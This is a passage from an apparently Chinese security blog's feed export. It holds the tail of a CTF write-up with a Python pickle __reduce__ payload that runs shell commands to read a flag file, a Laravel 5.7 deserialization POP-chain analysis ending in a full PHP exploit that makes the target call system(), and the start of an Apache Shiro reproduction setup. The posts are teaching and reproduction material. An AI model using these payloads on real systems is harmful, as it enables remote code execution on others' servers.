cmd = &quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;</span><br><span class="hljs-comment">#     return (eval, (&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;,))</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span>:</span><br>    uname = <span class="hljs-string">&#x27;aaa&#x27;</span><br>    is_admin = <span class="hljs-number">1</span><br>    __repr__: <span class="hljs-keyword">lambda</span> o: o.uname<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;echo `cat /flag` &gt; /tmp/111&#x27;).read()&quot;</span>,))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index_handler</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;u&#x27;</span>):<br>        u = pickle.dumps(User())<br>        session[<span class="hljs-string">&#x27;u&#x27;</span>] = u<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;/file?file=index.js&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">file_handler</span>():</span><br>    path = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>)<br>    path = os.path.join(<span class="hljs-string">&#x27;static&#x27;</span>, path)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(path) <span class="hljs-keyword">or</span> os.path.isdir(path) \<br>            <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.py&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;.sh&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> path <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> path:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;disallowed&#x27;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> fp:<br>        content = fp.read()<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin&#x27;</span>, methods=(<span class="hljs-params"><span class="hljs-string">&#x27;GET&#x27;</span>,</span>)</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">admin_handler</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        u = session.get(<span class="hljs-string">&#x27;u&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(u, <span class="hljs-built_in">dict</span>):<br>            u = b64decode(u.get(<span class="hljs-string">&#x27;b&#x27;</span>))<br>        u = pickle.loads(u)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;uhh?&#x27;</span><br><br>    <span class="hljs-keyword">if</span> u.is_admin == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome, admin&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;who are you?&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210504130220724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将session复制到原环境即可，正常成功的话再访问/admin应该返回500<br><img src="https://img-blog.csdnimg.cn/20210504130320450.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>总结一下：主要考点在于对flask的session机制的了解，对session伪造的掌握，还有要知道secrey key一般存放在环境变量的哪个文件夹，以及对python反序列化攻击的掌握.</p>]]></content>
    
    
    <categories>
      
      <category>buu刷题记录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUU</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>laravel5.7漏洞复现</title>
    <link href="/2021/04/30/2021-4.30-laravel5.7%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2021/04/30/2021-4.30-laravel5.7%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h3 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h3><ul><li>laravel环境搭建</li></ul><ul><li>pop链分析</li></ul><ul><li>构造反序列化payload<h2 id="laravel环境搭建"><a href="#laravel环境搭建" class="headerlink" title="laravel环境搭建"></a>laravel环境搭建</h2>这个不用多说了，网上很多大佬都写过很详细的博客，可以借鉴<h2 id="pop链分析"><a href="#pop链分析" class="headerlink" title="pop链分析"></a>pop链分析</h2>laravel5.7漏洞主要利用vendor/laravel/framework/src/Illuminate/Foundation/Testing文件夹下的一个PendingCommand类，该类中有几个私有特性<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;           <span class="hljs-comment">//一个实例化的类 Illuminate\Auth\GenericUser</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;         <span class="hljs-comment">//一个实例化的类 Illuminate\Foundation\Application</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$command</span>;     <span class="hljs-comment">//要执行的php函数 system</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;  <span class="hljs-comment">//要执行的php函数的参数  array(&#x27;id&#x27;)</span><br></code></pre></div></td></tr></table></figure></li><li>用于命令执行的函数为PendingCommand.php中的run()函数<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;hasExecuted = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-keyword">$this</span>-&gt;mockConsoleOutput();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-variable">$exitCode</span> = <span class="hljs-keyword">$this</span>-&gt;app[Kernel::class]-&gt;call(<span class="hljs-keyword">$this</span>-&gt;command, <span class="hljs-keyword">$this</span>-&gt;parameters);<br>        &#125; <span class="hljs-keyword">catch</span> (NoMatchingExpectationException <span class="hljs-variable">$e</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$e</span>-&gt;getMethodName() == <span class="hljs-string">&#x27;askQuestion&#x27;</span>) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;test-&gt;fail(<span class="hljs-string">&#x27;Unexpected question &quot;&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;getActualArguments()[<span class="hljs-number">0</span>]-&gt;getQuestion().<span class="hljs-string">&#x27;&quot; was asked.&#x27;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;expectedExitCode != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;test-&gt;assertTrue(<br>                <span class="hljs-variable">$exitCode</span> == <span class="hljs-keyword">$this</span>-&gt;expectedExitCode,<br>                <span class="hljs-string">&quot;Expected status code <span class="hljs-subst">&#123;$this-&gt;expectedExitCode&#125;</span> but received <span class="hljs-subst">&#123;$exitCode&#125;</span>.&quot;</span><br>            );<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$exitCode</span>;<br>    &#125;<br></code></pre></div></td></tr></table></figure>还有可以触发run函数的析构函数<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;hasExecuted) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">$this</span>-&gt;run();<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li>简单思路 构造反序列化调用析构函数，进入run方法进行代码执行观察run方法会进入第一个函数<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;mockConsoleOutput();<br></code></pre></div></td></tr></table></figure>跟进发现<br><img src="https://img-blog.csdnimg.cn/20210430125300802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里moke了一个虚拟的实例化类用于调试输出，具体实现也没看懂，直接跳过，中途发现有个foreach循环，这里对$this-&gt;test类的expectedOutput属性进行遍历作为数组，代码才能正常执行下去。但是该类并不存在expectedOutput属性；经过分析代码，我们发现这里只要能够返回一个数组代码就可以顺利进行下去。此时可以利用利用__get方法，因为读取不可访问属性的值时，__get() 会被调用。<br>经过全局搜索发现Illuminate\Auth\GenericUser类的get方法可利用，通过geet方法传入一个数组即可保证后面的代码顺利执行<br><img src="https://img-blog.csdnimg.cn/20210430130551168.png" alt="在这里插入图片描述"></li><li>后面的代码都是可以顺利执行下去的，接下来我们又回到了mockConsoleOutput()方法内，接下来又是一个forearch循环，如上一步的遍历数组一样，顺利执行下去</li><li>接下来代码会执行到$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);，其中Kernel::class为固定值”Illuminate\Contracts\Console\Kernel”<br>进入make方法后看到此时abstract参数是Illuminate\Contracts\Http\Kernel继续跟进getAlias<br><img src="https://img-blog.csdnimg.cn/20210430115658207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后判断aliases中的Illuminate\Contracts\Http\Kernel类是否存在并返回这个类名<br><img src="https://img-blog.csdnimg.cn/20210430120040909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>顺利执行完getAlias后回到make中最后会调用父类中的make函数，跟进父类中的make函数<br><img src="https://img-blog.csdnimg.cn/20210430120603552.png" alt="在这里插入图片描述"><br>跟进resolve函数<br><img src="https://img-blog.csdnimg.cn/20210430120955181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;instances[<span class="hljs-variable">$abstract</span>];=<span class="hljs-keyword">$this</span>-&gt;instances[<span class="hljs-string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>];<br></code></pre></div></td></tr></table></figure>也就是返回了Illuminate\Foundation\Application对象；即我们可以将任意对象赋值给 $this-&gt;instances[$abstract] ，这个对象最终会赋值给[Kernel::class]最后会进入到getconcret函数.<br><img src="https://img-blog.csdnimg.cn/20210430120816118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首先会判断binding数组中的$abstract是否存在，如果存在则返回$this-&gt;bindings[$abstract][‘concrete’]。最大的漏洞就出现在这里，通过整体跟踪，猜测开发者的本意应该是实例化Illuminate\Contracts\Http\Kernel这个类，但是在getConcrete这个方法中出了问题，导致可以利用php的反射机制实例化任意类。问题出在vendor/laravel/framework/src/Illuminate/Container/Container.php的704行，可以看到这里判断$this-&gt;bindings[$abstract])是否存在，若存在则返回$this-&gt;bindings[$abstract][‘concrete’]。$bindings是vendor/laravel/framework/src/Illuminate/Container/Container.php文件中Container类中的属性。因此我们只要寻找一个继承自Container的类，即可通过反序列化控制$this-&gt;bindings属性。而Illuminate\Foundation\Application恰好继承自Container类，这就是选择Illuminate\Foundation\Application对象放入$this-&gt;app的原因。由于我们已知$abstract变量为Illuminate\Contracts\Console\Kernel，所以我们只需通过反序列化定义Illuminate\Foundation\Application的$bindings属性存在键名为Illuminate\Contracts\Console\Kernel的二维数组就能进入该分支语句，返回我们要实例化的类名。在这里返回的是Illuminate\Foundation\Application类。<br>此处出getconcrete函数后进入<br><img src="https://img-blog.csdnimg.cn/20210430121550361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跟进发现<br><img src="https://img-blog.csdnimg.cn/2021043013102699.png" alt="在这里插入图片描述"><br>此处判断$concrete和$abstract的值是否相等，此处显然不会相等，则进入make方法<br><img src="https://img-blog.csdnimg.cn/20210430121839911.png" alt="在这里插入图片描述"><br>在第二遍循环之后$concrete和$abstract的值则会相等然后进入build函数<br><img src="https://img-blog.csdnimg.cn/20210430122137724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到build中会通过reflectionclass反射机制实例化我们传入的类，最终$this-&gt;app[Kernel::class]返回的内容就是我们创建的Illuminate\Foundation\Application类的对象。<br>在返回一个对象之后，又调用了call方法。实际上Illuminate\Foundation\Application类没有call方法，但是它的父类Illuminate\Container\Container是有call方法的。因此，在这里会直接跳转到Illuminate\Container\Container类中的call方法。<br>之后进入到<br><img src="https://img-blog.csdnimg.cn/20210430123738266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>其中isCallableWithAtSign()方法是判断确定给定的字符串是否使用Class@method语法，不满足自然跳出，执行到callBoundMethod，跟进发现其只是判断是否为数组<br><img src="https://img-blog.csdnimg.cn/20210430123920702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>跟进后面的匿名函数则可以发现<br><img src="https://img-blog.csdnimg.cn/20210430124243640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>中间代码看的不太懂只用看最后一行，它将我们传入的$parameters数组和$dependencies数组合并，其中$dependencies数组为空，而$parameters数组是我们可控的。最终也就是执行了<figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php">call_user_func_array(<span class="hljs-string">&#x27;xxx&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;xxx&#x27;</span>));<br></code></pre></div></td></tr></table></figure>到这pop链就已经分析完成了！！</li></ul><h2 id="构造反序列化payload"><a href="#构造反序列化payload" class="headerlink" title="构造反序列化payload"></a>构造反序列化payload</h2><p>直接放exp如下</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>\<span class="hljs-title">Testing</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">PendingCommand</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">command</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$parameters</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$app</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$command</span>, <span class="hljs-variable">$parameters</span>,<span class="hljs-variable">$class</span>,<span class="hljs-variable">$app</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;command = <span class="hljs-variable">$command</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;parameters = <span class="hljs-variable">$parameters</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;test=<span class="hljs-variable">$class</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;app=<span class="hljs-variable">$app</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">GenericUser</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">attributes</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$attributes</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;attributes = <span class="hljs-variable">$attributes</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Foundation</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">Application</span>&#123;<br>        <span class="hljs-title">protected</span> $<span class="hljs-title">hasBeenBootstrapped</span> = <span class="hljs-title">false</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindings</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$bind</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;bindings=<span class="hljs-variable">$bind</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    $<span class="hljs-title">genericuser</span> = <span class="hljs-title">new</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Auth</span>\<span class="hljs-title">GenericUser</span>(<br>        <span class="hljs-title">array</span>(<br>            &quot;<span class="hljs-title">expectedOutput</span>&quot;=&gt;<span class="hljs-title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;),<br>            &quot;<span class="hljs-title">expectedQuestions</span>&quot;=&gt;<span class="hljs-title">array</span>(&quot;0&quot;=&gt;&quot;1&quot;)<br>             )<br>    );<br>    <span class="hljs-variable">$application</span> = <span class="hljs-keyword">new</span> Illuminate\Foundation\Application(<br>        <span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>=&gt;<br>                <span class="hljs-keyword">array</span>(<br>                    <span class="hljs-string">&quot;concrete&quot;</span>=&gt;<span class="hljs-string">&quot;Illuminate\Foundation\Application&quot;</span><br>                     )<br>             )<br>    );<br>    <span class="hljs-variable">$pendingcommand</span> = <span class="hljs-keyword">new</span> Illuminate\Foundation\Testing\PendingCommand(<br>        <span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;dir&#x27;</span>),<br>        <span class="hljs-variable">$genericuser</span>,<br>        <span class="hljs-variable">$application</span><br>    );<br>    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pendingcommand</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>laravel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>laravel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Apache Shiro 反序列化漏洞</title>
    <link href="/2021/04/30/2021-6-26-Shrio721/"/>
    <url>/2021/04/30/2021-6-26-Shrio721/</url>
    
    <content type="html"><![CDATA[<h2 id="Apache-Shiro-反序列化漏洞（Shiro-721-CVE-2016-4437）"><a href="#Apache-Shiro-反序列化漏洞（Shiro-721-CVE-2016-4437）" class="headerlink" title="Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437）"></a>Apache Shiro 反序列化漏洞（Shiro-721 CVE-2016-4437）</h2><blockquote><p>Apache Shiro是一个强大且易用的Java安全框架,其支持身份验证、授权、密码和会话管理等。使用Shiro的API可以快速、轻松地获得任何应用程序。</p><p>2021年02月01日，Apache Shiro发布1.7.1版本，修复了 Apache Shiro 中的一个身份验证绕过漏洞（CVE-2020-17523）。当Apache Shiro与Spring结合使用时，攻击者可以使用恶意HTTP请求来绕过Shiro的身份认证。成功利用此漏洞的攻击者可以绕过身份验证，成功访问后台。</p></blockquote><blockquote><p>Apache Shiro 存在高危代码执行漏洞。该漏洞是由于Apache Shiro cookie中通过 AES-128-CBC 模式加密的rememberMe字段存在问题，用户可通过Padding Oracle 加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p></blockquote><h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>复现环境: Apache Shiro 1.4.1 + tomcat:8-jre8<br>git下载shiro-720到本地环境</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/3ndz/</span>Shiro-<span class="hljs-number">721</span>.git<br></code></pre></div></td></tr></table></figure><p>对shiro-720进行编译</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">Shiro-721/Docker</span><br><span class="hljs-keyword">docker </span><span class="hljs-keyword">build </span>-t <span class="hljs-keyword">shiro-721 </span>.<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620132903892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>启动dokcer并将端口8080映射到主机端口9000上</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -p <span class="hljs-number">9000</span>:<span class="hljs-number">8080</span> -d shiro-<span class="hljs-number">721</span><br></code></pre></div></td></tr></table></figure><p>查看是否搭建成功</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133006473.png" alt="在这里插入图片描述"></p><h4 id="通过自行编译1-4-1war-包放入tomcat容器中运行"><a href="#通过自行编译1-4-1war-包放入tomcat容器中运行" class="headerlink" title="通过自行编译1.4.1war 包放入tomcat容器中运行"></a>通过自行编译1.4.1war 包放入tomcat容器中运行</h4><p>安装maven</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://downloads.apache.org/maven/maven-<span class="hljs-number">3</span>/<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>/binaries/apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>-bin.tar.gz<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133119100.png" alt="在这里插入图片描述"></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> zxvf  apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>-bin.tar.gz  -C  /usr/local<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133234604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>添加环境变量</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code 